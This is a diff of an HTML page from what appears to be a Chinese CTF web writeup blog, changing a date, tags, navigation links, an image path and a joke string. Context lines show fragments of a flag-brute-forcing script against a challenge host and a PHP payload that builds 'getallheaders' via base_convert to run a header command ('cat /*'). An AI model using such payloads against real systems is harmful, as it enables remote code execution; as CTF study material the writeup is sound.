@@ -27,7 +27,7 @@
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 
   
-    <meta name="keywords" content="Web,CTF6," />
+    <meta name="keywords" content="Web,CTF," />
   
 
   <script>
@@ -232,7 +232,7 @@
   <div class="article-top-meta">
     <span>
       发布 : 
-      2020-08-06
+      2020-09-13
     </span>
     
       <span>
@@ -408,7 +408,7 @@ import os
 url = &#39;http://d6c542d7-50d8-473e-b494-1ca2bfc8c09c.node3.buuoj.cn/&#39;
 dic = &#39;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789{}_-@&#39;
 flag = &#39;&#39;
-glzjin=&quot;Hello, glzjin wants a girlfriend.&quot;
+glzjin=&quot;Hello, L1dng wants a girlfriend.&quot;
 for i in xrange(1,50):
     if &#39;}&#39; in flag :
         os._exit(0)
@@ -936,7 +936,7 @@ string(4) &quot;_GET&quot;</code></pre>
 $pi(8768397090111664438,10,30) =&gt; &quot;getallheaders&quot;
 exec(getallheaders(){1})</code></pre>
 <p>这里发现了一个问题，字符串太长的时候，好像进制转换就会出问题，最大字母为<code>s</code>所以至少需要29进制来转。</p>
-<p><img src="C:%5CUsers%5C18751%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200828185526103.png" alt="image-20200828185526103"></p>
+<p><img src="https://i.loli.net/2020/09/14/1OjDMkw3RvzW9ey.png" alt="image-20200828185526103"></p>
 <p>结果只有30进制满足条件。至于其中原因暂时不明白，大概字符串太长就好像有这个问题。</p>
 <p>最终payload：</p>
 <pre><code class="php">?c=($pi=base_convert)(696468,10,36)($pi(8768397090111664438,10,30)(){1})
@@ -957,8 +957,8 @@ ADD HEADER 1:cat /*</code></pre>
           <i class="iconfont icon-06tags"></i>标签: 
           
           <span class="span--tag">
-            <a href="/tags/CTF6/">
-              #CTF6
+            <a href="/tags/CTF/">
+              #CTF
             </a>
           </span>
           
@@ -983,13 +983,13 @@ ADD HEADER 1:cat /*</code></pre>
       <div class="nav-pre">
         <i class="iconfont icon-prev"></i>
         上一篇:
-        <a href="/passagesXCTF-CyBRICS/" target="_self">CyBRICS CTF 2020 Writeup</a>
+        <a href="/passagesDDCTF/" target="_self">DDCTF</a>
       </div>
     
     
       <div class="nav-next">
         下一篇:
-        <a href="/passages%E5%9B%BD%E8%B5%9B/" target="_self">CISCN 2020 Web Writeup</a>
+        <a href="/passagesGACTF%20%20Web%20Writeup/" target="_self">GACTF 2020 Web Writeup</a>
         <i class="iconfont icon-next"></i>
       </div>
     
